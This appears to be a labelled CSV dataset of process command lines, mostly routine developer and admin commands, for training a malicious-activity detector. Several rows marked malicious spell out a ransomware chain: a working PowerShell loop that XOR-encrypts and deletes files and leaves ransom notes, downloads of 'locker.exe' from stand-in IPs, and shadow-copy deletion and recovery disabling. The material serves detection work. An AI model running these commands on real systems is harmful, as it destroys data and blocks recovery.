process_name,command_line,label
powershell.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$k=Get-Content C:\ProgramData\targets.txt; foreach($f in $k){ try { $b=[System.IO.File]::ReadAllBytes($f); for($i=0;$i -lt $b.Length;$i++){ $b[$i]=$b[$i] -bxor 0x5A }; [System.IO.File]::WriteAllBytes($f + '.locked',$b); Remove-Item $f -Force; Set-Content -Path ((Split-Path $f) + '\README_RESTORE_FILES.txt') -Value 'Your files have been encrypted. Contact attacker for recovery.' -Force } catch {} }""",malicious
pg_dump,pg_dump -U postgres appdb > appdb_backup.sql,benign
git,git pull --rebase origin main,benign
ansible-playbook,ansible-playbook -i inventory.ini site.yml --limit web,benign
ps,ps aux --sort=-%mem | head,benign
ls,ls -lah ~/Downloads,benign
ssh-keygen,"ssh-keygen -t ed25519 -C ""dev@example.com"" -f ~/.ssh/id_ed25519_work",benign
journalctl,journalctl -u nginx --since '1 hour ago',benign
nohup,nohup python worker.py > worker.log 2>&1 &,benign
python.exe,python.exe -m pip list --outdated,benign
cargo,cargo build --release,benign
wsl.exe,wsl.exe -d Ubuntu -- uname -a,benign
traceroute,traceroute github.com,benign
nslookup.exe,nslookup.exe example.com,benign
python,python -m pytest tests/unit -q,benign
pip,pip install black flake8 mypy,benign
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root""",malicious
mysqldump,mysqldump -u root -p inventory > inventory.sql,benign
python,python -m pip install -r requirements.txt,benign
whereis,whereis nginx,benign
yum,sudo yum install -y tree,benign
tar,tar -czf backup-configs.tar.gz /etc/nginx /etc/systemd/system,benign
flatpak,flatpak update -y,benign
head,head -n 20 access.log,benign
mysql,"mysql -u appuser -p -e ""SHOW DATABASES;""",benign
winget.exe,winget.exe upgrade --all,benign
cmd.exe,cmd.exe /c dir C:\Users\ /s /b *.docx *.xlsx *.pdf,malicious
dnf,sudo dnf check-update,benign
gcc,gcc -O2 -Wall -o bin/tool src/tool.c,benign
docker-compose,docker-compose logs -f db,benign
mv,mv report-final.txt report-2026-06.txt,benign
ln,ln -s /opt/node/bin/node /usr/local/bin/node,benign
wc,wc -l data/events.jsonl,benign
powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 20""",benign
wget,wget https://releases.ubuntu.com/24.04/SHA256SUMS,benign
fish,fish -c 'set -S PATH',benign
yarn,yarn install --frozen-lockfile,benign
certutil.exe,certutil.exe -urlcache -split -f http://203.0.113.50/payloads/locker.exe C:\ProgramData\locker.exe,malicious
find,"find . -type f -name ""*.log"" -mtime -1",benign
cmd.exe,cmd.exe /c dir C:\Projects\App\src,benign
redis-cli,redis-cli ping,benign
git,git push -u origin feature/login-form,benign
sudo,sudo apt update,benign
reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,benign
cmake,cmake --build build -j4,benign
locker.exe,C:\ProgramData\locker.exe --encrypt C:\Users --shares \\fileserver\finance --note C:\ProgramData\README_RESTORE.txt,malicious
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File .\scripts\build.ps1 -Configuration Release,benign
jq,jq '.users[] | select(.active==true)' data/users.json,benign
netstat.exe,netstat.exe -ano,benign
cut,cut -d: -f1 /etc/passwd,benign
npm,npm install,benign
patch,patch -p1 < fixes.patch,benign
curl,curl -I https://example.com,benign
strace,strace -p 12345,benign
tracert.exe,tracert.exe github.com,benign
sw_vers,sw_vers,benign
ss,ss -tulpn,benign
brew,brew upgrade python,benign
notepad.exe,notepad.exe C:\Temp\notes.txt,benign
sqlite3,"sqlite3 app.db ""SELECT count(*) FROM users;""",benign
gpg,gpg --list-secret-keys --keyid-format LONG,benign
clang,clang -Weverything hello.c -o hello,benign
openssl,openssl x509 -in server.crt -noout -dates,benign
git.exe,git.exe clone https://github.com/microsoft/PowerToys.git,benign
cmake,cmake -S . -B build,benign
dotnet,dotnet test tests/MyApp.Tests/MyApp.Tests.csproj,benign
cmd.exe,cmd.exe /c type C:\Windows\System32\drivers\etc\hosts,benign
defaults,defaults read com.apple.finder AppleShowAllFiles,benign
code,code .,benign
docker,docker exec -it web bash,benign
history,history | tail -20,benign
vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
brew,brew install wget,benign
crontab,crontab -l,benign
cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
packer,packer validate ubuntu.pkr.hcl,benign
file,file ~/Downloads/setup.bin,benign
pwd,pwd,benign
dotnet,dotnet restore,benign
helm,helm list -A,benign
mvn,mvn clean package -DskipTests,benign
nslookup,nslookup intranet.local,benign
df,df -h,benign
npx,npx create-react-app dashboard-ui,benign
lsof,lsof -i :8080,benign
sed,"sed -n '1,120p' config/app.conf",benign
schtasks.exe,schtasks.exe /Query /FO LIST /V,benign
make,make test,benign
docker-compose,docker-compose up -d,benign
hostname,hostnamectl status,benign
man,man rsync,benign
choco.exe,choco.exe install 7zip -y,benign
git,"git commit -m ""Add client-side validation for login form""",benign
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-SmbShare | Select-Object Name,Path""",malicious
which,which python3,benign
explorer.exe,explorer.exe C:\Users\Alice\Downloads,benign
netstat,netstat -rn,benign
docker,docker ps,benign
less,less /var/log/nginx/error.log,benign
cmd.exe,"cmd.exe /c C:\ProgramData\locker.exe --path C:\ --path \\fileserver\finance --note ""Your files have been encrypted. Contact us at recovery@mailfence.com""",malicious
powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem C:\Users\Public\Documents""",benign
yarn,yarn start,benign
scp,scp nginx.conf admin@web01.example.net:/tmp/nginx.conf,benign
ipconfig.exe,ipconfig.exe /all,benign
tee,"echo ""export GOPATH=$HOME/go"" | tee -a ~/.profile",benign
nano,nano /etc/hosts,benign
docker,docker logs --tail 100 api,benign
systemctl,sudo systemctl enable postgresql,benign
ping.exe,ping.exe -n 4 intranet.company.local,benign
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,malicious
dig,dig example.org MX +short,benign
pwsh,"pwsh -NoLogo -Command ""Get-Date; Get-Location""",benign
uname,uname -a,benign
docker,docker run --rm -p 8080:80 nginx:latest,benign
sort,sort names.txt | uniq -c | sort -nr,benign
whoami,whoami,benign
pacman,sudo pacman -Syu,benign
mkdir,mkdir -p ~/workspace/archive/2026-06,benign
screen,screen -ls,benign
ansible,ansible all -i inventory.ini -m ping,benign
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-ChildItem -Path C:\Users -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf,*.jpg,*.txt -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName > C:\ProgramData\targets.txt""",malicious
g++,g++ -std=c++17 -O2 -o app src/main.cpp,benign
open,open -a Safari https://developer.apple.com,benign
lldb,lldb ./bin/service,benign
systeminfo.exe,systeminfo.exe,benign
python,python -m venv .venv,benign
du,du -sh ~/projects/* | sort -h,benign
free,free -m,benign
ifconfig,ifconfig en0,benign
apt,apt list --upgradable,benign
unzip,unzip release-artifacts.zip -d /tmp/release-artifacts,benign
go,go build -o bin/service ./cmd/service,benign
npm,npm test -- --watch=false,benign
osascript,"osascript -e 'display notification ""Build completed"" with title ""CI""'",benign
docker,docker build -t myapp:dev .,benign
yarn,yarn test --coverage,benign
gradle,gradle test,benign
cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri http://192.168.56.10/payloads/locker.exe -OutFile C:\ProgramData\locker.exe""",malicious
